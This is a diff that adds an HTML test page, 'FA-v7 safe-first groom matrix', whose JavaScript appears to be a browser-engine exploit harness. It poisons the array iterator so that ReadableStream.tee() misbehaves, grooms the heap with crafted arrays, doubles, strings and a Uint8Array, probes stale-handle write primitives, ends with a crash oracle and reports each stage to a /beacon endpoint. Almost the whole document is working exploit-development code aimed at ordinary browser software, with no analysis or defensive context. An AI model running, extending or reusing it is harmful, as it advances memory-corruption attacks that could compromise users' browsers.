@@ -1,0 +1,82 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate"><title>FA-v7 — safe-first groom matrix (C0→G2→G4→G5(write-beside)→G1(stale)→G3(last crash oracle))</title></head>
+<body><pre id="out">FA-v7 — order fixed: safe shapes FIRST, crashe LAST
+</pre><script>
+(function(){
+ "use strict";
+ var run = "fv7" + Date.now().toString(36) + "-" + Math.floor(Math.random()*1e6).toString(36);
+ var out = document.getElementById("out");
+ function say(s){ out.appendChild(document.createTextNode("\n"+s)); }
+ function beacon(st, body){
+   try {
+     var x = new XMLHttpRequest();
+     x.open("POST", "/beacon/FV7-"+st+"/"+run, false);
+     x.setRequestHeader("Content-Type","application/json");
+     x.send(JSON.stringify({body:body}));
+   } catch(e){ try{ say("beacon-err "+st); }catch(e2){} }
+ }
+ var origIter = Array.prototype[Symbol.iterator];
+ function poisonOverYield(){ return function(){ var arr=this,i=0,n=arr.length+1;
+   return { next:function(){ if(i>=n) return {done:true}; var v=(i<arr.length)?arr[i]:{}; i++; return {value:v, done:false}; } }; }; }
+ function poisonOverYieldStash(){ return function(){ var arr=this,i=0,n=arr.length+1;
+   window.__stashed = [arr[0], arr[1]];
+   return { next:function(){ if(i>=n) return {done:true}; var v=(i<arr.length)?arr[i]:{}; i++; return {value:v, done:false}; } }; }; }
+ function poisonUnderYieldObj(){ return function(){ var arr=this,i=0,n=(arr.length>=2)?1:arr.length;
+   return { next:function(){ if(i>=n) return {done:true}; i++; return {value:{fake:i}, done:false}; } }; }; }
+ function poisonUnderYieldStr(){ return function(){ var arr=this,i=0,n=(arr.length>=2)?1:arr.length;
+   return { next:function(){ if(i>=n) return {done:true}; i++; return {value:"aBseed", done:false}; } }; }; }
+ function poisonUnderYieldUint(){ return function(){ var arr=this,i=0,n=(arr.length>=2)?1:arr.length;
+   return { next:function(){ if(i>=n) return {done:true}; i++; var g=new Uint8Array(128); return {value:g, done:false}; } }; }; }
+ function v(id, label, poisonFn, work){
+   try {
+     beacon(id+"A", label);
+     try { Array.prototype[Symbol.iterator] = poisonFn(); } catch(e){ Array.prototype[Symbol.iterator]=origIter; }
+     var outx = work();
+     try { Array.prototype[Symbol.iterator] = origIter; } catch(e2){}
+     beacon(id+"B", "survived | "+String(outx).slice(0,230));
+   } catch(e) {
+     try { Array.prototype[Symbol.iterator] = origIter; } catch(e2){}
+     beacon(id+"E", "typeErr-guard | "+String(e).slice(0,180));
+   }
+ }
+ // C0
+ try {
+   beacon("C0A","unpoisoned control");
+   var rs0 = new ReadableStream({}); var p0 = rs0.tee();
+   beacon("C0B","BUGLIVE=false;C0-CLEAN;pair.length="+p0.length);
+ } catch(e){ beacon("C0E","C0 threw: "+String(e).slice(0,120)); }
+ // G2 — butterfly groom (SAFE first)
+ v("G2", "G2 butterfly groom (K=2 pre-props header shift)", poisonOverYieldStash, function(){
+   var g = new Array(14); for (var i=0;i<2;i++) g["pre"+i] = 7;
+   var rs = new ReadableStream({}); var pair = rs.tee();
+   return "butterfly-run (window +8..+120)"; });
+ // G4 — double-bits immediate groom (SAFE)
+ v("G4", "G4 double-bits immediate (crafted) groom", poisonOverYieldStash, function(){
+   var g = new Array(14); for (var i=0;i<14;i++) g[i] = 1.4213759489e-314;
+   var rs = new ReadableStream({}); var pair = rs.tee();
+   return "double-bits (immediate-bits as HandleSlot result)"; });
+ // G5 — StringImpl write-beside SHAPE-W (SAFE first attempt — FIRST REAL WRITE TEST)
+ v("G5", "G5 StringImpl groom write-beside SHAPE-W", poisonUnderYieldStr, function(){
+   var sl1 = "seed-string-1"; var sl2 = "seed-string-2";
+   var rs = new ReadableStream({}); var pair = rs.tee();
+   try { pair[1].cancel(); } catch(ec){ say("G5 inner throw:"+ec); }
+   Array.prototype[Symbol.iterator] = origIter;
+   var l1 = sl1.length, l2 = sl2.length;
+   return "strFlip-check: l1="+l1+" l2="+l2+" (WRITE-FLIP if changed)"; });
+ // G1 — stale-HandleSlot deputy-write with REAL-record readback (safe-then-write)
+ v("G1", "G1 stale-HandleSlot deputy-write + readback", poisonUnderYieldObj, function(){
+   var rs1 = new ReadableStream({}); var pair1 = rs1.tee(); window.__readableRef = pair1[0];
+   var rs2 = new ReadableStream({}); var pair2 = rs2.tee();
+   if (!(pair2[0] instanceof ReadableStream)) throw "pair2[0] not RS";
+   var b = window.__readableRef.locked;
+   try { pair2[0].cancel(); } catch(ec){}
+   var a = window.__readableRef.locked;
+   if (b !== a) return "WRITE-FLIP=1;before="+b+";after="+a;
+   return "no-write; stale chunk gone (bmalloc freelist different path)"; });
+ // G3 — Uint8Array(128) raw groom (the ONLY crash-oracle — LAST single-shot)
+ v("G3", "G3 Uint8Array(128) raw groom — CRASH-ORACLE LAST", poisonOverYieldStash, function(){
+   var g = new Uint8Array(128); for (var i=0;i<128;i++) g[i] = (i*7)%256;
+   var rs = new ReadableStream({}); var pair = rs.tee(); return "survived G3"; });
+ beacon("Z", "battery-complete FA-v7 (safe-first order)");
+ say("FA-v7 battery complete");
+})();
+</script></body></html>
